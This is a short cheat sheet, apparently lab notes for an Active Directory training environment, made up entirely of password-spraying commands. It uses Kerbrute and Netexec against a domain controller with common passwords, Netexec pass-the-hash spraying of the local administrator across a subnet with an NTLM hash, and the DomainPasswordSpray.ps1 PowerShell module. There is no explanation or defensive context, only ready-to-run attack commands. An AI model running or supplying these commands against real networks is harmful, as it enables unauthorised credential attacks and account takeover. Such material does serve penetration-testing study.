
## Using Kerbrute

```ruby
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Password123
```

## Using Netexec

```ruby
netexec 172.16.5.5 -u valid_users.txt -p Password123
```


## Local Admin Spraying with Netexec

```ruby
netexec smb 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf   --local-auth 
```


## Using DomainPasswordSpray.ps1 from windows


#### Using DomainPasswordSpray.ps1

```ruby
Import-Module .\DomainPasswordSpray.ps1
```

```ruby
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

